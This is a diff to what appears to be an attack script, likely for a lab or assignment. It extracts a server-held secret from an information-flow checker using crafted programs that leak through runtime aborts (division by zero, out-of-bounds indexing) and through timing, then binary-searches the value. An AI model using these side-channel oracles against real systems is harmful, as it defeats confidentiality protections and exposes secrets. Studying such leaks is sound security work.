@@ -176,6 +176,38 @@ EXPR_INTCAST_DIV_REV_ORACLE_PROGRAM = """int main(int input, int secret) {
 }
 """
 
+EXPR_INDEX_BOOL_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int[] A = alloc_array(int, 1);
+  //@label H;
+  bool witness = (A[secret < input] == 0);
+  return 0;
+}
+"""
+
+EXPR_INDEX_BOOL_REV_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  int[] A = alloc_array(int, 1);
+  //@label H;
+  bool witness = (A[input <= secret] == 0);
+  return 0;
+}
+"""
+
+EXPR_DIV_BOOL_CMP_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  bool witness = ((1 / (secret < input)) == 1);
+  return 0;
+}
+"""
+
+EXPR_MOD_BOOL_CMP_ORACLE_PROGRAM = """int main(int input, int secret) {
+  //@label H;
+  bool witness = ((1 % (secret < input)) == 0);
+  return 0;
+}
+"""
+
 TERMINATION_ORACLE_PROGRAM = """int main(int input, int secret) {
   if (secret < input) {
     while (true) {
@@ -678,6 +710,40 @@ def recover_from_kind_oracle(
         return binary_search_oracle(lambda mid: not classify(mid))
 
 
+def recover_from_strict_expr_abort_suite(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+) -> int:
+    probes = [
+        ("&& div0", EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM),
+        ("&& mod0", EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM),
+        ("&& oob", EXPR_ABORT_AND_OOB_ORACLE_PROGRAM),
+    ]
+    last_error = "strict expr-abort suite did not produce a usable oracle"
+    for probe_name, source in probes:
+        try:
+            return recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=source,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            )
+        except StrategyFailed as e:
+            msg = str(e)
+            # If the first strict probe always aborts for both endpoints, the
+            # rest of this family tends to be equally non-informative.
+            if "boundary check failed (at 0 => True, at 2^62 => True)" in msg:
+                raise StrategyFailed(
+                    f"strict expr-abort probes non-informative ({probe_name} always-abort endpoints)"
+                ) from e
+            last_error = f"{probe_name}: {msg}"
+    raise StrategyFailed(last_error)
+
+
 def median_runtime_for_input(
     *,
     server_command: str,
@@ -771,7 +837,10 @@ def recover_from_timing_oracle(
         )
 
     last_failure = "no timing candidates worked"
+    skip_remaining_loop_burn = False
     for candidate_name, source in candidates:
+        if skip_remaining_loop_burn and candidate_name.startswith("loop-burn="):
+            continue
         with ProgramFile(source) as path:
             try:
                 t_false = median_runtime_for_input(
@@ -793,6 +862,8 @@ def recover_from_timing_oracle(
             except StrategyFailed as e:
                 last_failure = str(e)
                 debug_log(debug, f"[timing] {candidate_name}: {last_failure}")
+                if candidate_name.startswith("loop-burn=") and "kind=insecure" in last_failure:
+                    skip_remaining_loop_burn = True
                 continue
 
             ratio = t_true / max(t_false, 1e-9)
@@ -1222,36 +1293,11 @@ def recover_server_secret(
     ]
     strict_mode_strategies: list[tuple[str, Callable[[], int]]] = [
         (
-            "expr abort oracle (&& div0)",
-            lambda: recover_from_kind_oracle(
+            "strict expr-abort suite",
+            lambda: recover_from_strict_expr_abort_suite(
                 server_command=server_command,
                 userid=userid,
                 timeout_s=tuned_query_timeout,
-                program_source=EXPR_ABORT_AND_DIVZERO_ORACLE_PROGRAM,
-                true_kinds={"abort"},
-                false_kinds={"failure"},
-            ),
-        ),
-        (
-            "expr abort oracle (&& mod0)",
-            lambda: recover_from_kind_oracle(
-                server_command=server_command,
-                userid=userid,
-                timeout_s=tuned_query_timeout,
-                program_source=EXPR_ABORT_AND_MODZERO_ORACLE_PROGRAM,
-                true_kinds={"abort"},
-                false_kinds={"failure"},
-            ),
-        ),
-        (
-            "expr abort oracle (&& oob)",
-            lambda: recover_from_kind_oracle(
-                server_command=server_command,
-                userid=userid,
-                timeout_s=tuned_query_timeout,
-                program_source=EXPR_ABORT_AND_OOB_ORACLE_PROGRAM,
-                true_kinds={"abort"},
-                false_kinds={"failure"},
             ),
         ),
         (
@@ -1300,6 +1346,11 @@ def recover_server_secret(
                 f"[serve{server_idx}] candidate {secret} from {strategy_name} failed verification "
                 f"({verify_passes}/1)",
             )
+    if strict_policy_mode:
+        log(
+            f"[serve{server_idx}] summary: strict-policy fingerprint; remaining channels "
+            "appear rejected or too noisy to verify"
+        )
     return None
 
 
